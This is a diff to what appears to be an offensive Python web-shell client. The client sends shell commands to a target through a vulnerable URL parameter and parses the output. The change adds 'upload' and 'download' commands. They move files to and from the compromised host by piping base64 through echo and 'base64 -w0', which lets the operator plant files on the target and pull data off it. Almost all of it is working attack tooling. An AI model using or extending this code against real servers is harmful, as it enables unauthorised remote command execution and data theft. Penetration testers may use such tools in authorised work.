@@ -282,24 +282,99 @@ def pwd_filter(pwd):
 
 
 #=================================================================================================================================================	
-# This function checks for webshell commands
+# This function stores custom for webshell commands
 #=================================================================================================================================================	
 
-def webshell_help(cmd=None):
-	if cmd == "help":
-		cmds = ['clear' , 'exit' , 'help' ]
+def custom_commands(cmd , pwd):
+
+	def help():
+		cmds = ['clear' , 'exit' , 'help' , 'upload' , 'download' ]
 		for each in cmds:
 			print(f"\t{cmds.index(each) + 1}. {each}")
-		return True
-	else:
-		if cmd == "exit":
-			ainfo("Exitting...")
-			sys.exit()
-		if cmd == "clear":
-			print("\x1b[2J\x1b[H",end="")
-			return True
+		return ""
+
+	def clear():
+		print("\x1b[2J\x1b[H",end="")
+		return ""
+
+
+	def exit():
+		ainfo("Exitting...")
+		sys.exit()
+
+
+	def upload(args , pwd):
+		if len(args) != 3:
+			print("cshell command : upload <Local-file-location [Absolute-Path-preffered]> <Remote-file-location [Absolute-Path-preffered]>")
+			return ""
 		else:
-			return False
+			localfile_abs_path = args[1]
+			localfile_name = list(map(str , args[1].split("/")))[-1]
+			localfile = base64.b64encode(open(args[1] , "rb").read()).decode()
+			remotefile = args[2]
+			if remotefile == ".":
+				remotefile = pwd +  "/"+localfile_name
+			else:
+				if remotefile[-1] == "/":
+					remotefile = remotefile + localfile_name
+				else:
+					remotefile = remotefile 
+			
+
+			ainfo(f"Uploading {localfile_abs_path} as {remotefile}")
+			output = f"echo \'{localfile}\' | base64 -d > {remotefile}"
+			return output
+	def download(args):
+		if len(args) != 3:
+			print("cshell command : download <Remote-file-location [Absolute-Path-preffered]> <Local-file-location [Absolute-Path-preffered]>")
+			sys.exit()
+		else:
+			global localfile
+			remotefile = args[1]
+			localfile = args[2]
+			remotefile_name = list(map(str , remotefile.split("/")))[-1]
+			if localfile == ".":
+				localfile = os.getcwd() + "/" + remotefile_name
+			else:
+				if localfile[-1] == "/":
+					localfile = localfile + remotefile_name
+				else:
+					localfile = localfile
+			ainfo(f"Downloading {remotefile} as {localfile}")
+			output = f"base64 -w0 {remotefile}"
+			return output
+
+
+
+
+
+	args = list(map(str , cmd.split()))
+	base_cmd = args[0]
+	if base_cmd == "help":
+		return help()
+	elif base_cmd == "clear":
+		return clear()
+	elif base_cmd == "exit":
+		return exit()
+	elif base_cmd == "upload":
+		return upload(args=args , pwd=pwd)
+	elif base_cmd == "download":
+		return download(args)
+	else:
+		return cmd
+
+
+
+def save_downloaded_file(cmd_inpt , output ):
+	args = list(map(str , cmd_inpt.split()))
+	base_cmd = args[0]
+	if base_cmd == "download":
+		file = open(localfile , "wb").write(base64.b64decode(output.rstrip().encode()))
+		return True
+	elif base_cmd == "upload":
+		return True # Returning True here, just to prevent the code from priniting new line on response.
+	else:
+		return False
 
 
 #=================================================================================================================================================
@@ -330,9 +405,12 @@ def webshell(target ,method , param , data , headers , cookies , proxies):
 			readline.parse_and_bind('set editing-mode vi')
 			while 1:
 				try:
-					inpt = input(prompt(pwd , hostname , whoami)) #creaye prompt and asks for command
-					if webshell_help(inpt): # check if command matches the help
-						continue 
+					cmd_inpt = input(prompt(pwd , hostname , whoami)) #creaye prompt and asks for command
+					custom_cmd_check = custom_commands(cmd_inpt , pwd=pwd)
+					if custom_cmd_check != "": # check if command matches the help
+						inpt = custom_cmd_check
+					else:
+						continue
 					if method == "GET":
 						cmd = requests.utils.quote(f"echo -n [OUTPUT_START] && cd {pwd}&&{inpt} 2>&1 &&echo [PROMPT_START]$(pwd)[+]$(hostname)[+]$(whoami)[PROMPT_END][OUTPUT_END]") # sending 2>&1 with the prompt in order to get the error message 
 						res = requests.get(f"{target.replace('WEB' , cmd)}" , headers=headers , cookies=cookies , proxies=proxies )
@@ -346,7 +424,11 @@ def webshell(target ,method , param , data , headers , cookies , proxies):
 					if "[OUTPUT_START]" in res.text and '[OUTPUT_END]' in res.text:
 						response = res.text.split("[OUTPUT_START]")[1].split('[OUTPUT_END]')[0].split("[PROMPT_START]")
 						output = str("".join(response[:1])).rstrip()
-						print ((output))
+
+						# Add this to download the file if user tries to download a file
+						if not save_downloaded_file(cmd_inpt=cmd_inpt , output=output):
+							print(output.rstrip())
+
 						prompt_arr = list(map(str , response[1].split("[+]")))
 						pwd = pwd_filter(prompt_arr[0].rstrip())
 						hostname = prompt_arr[-2].rstrip()
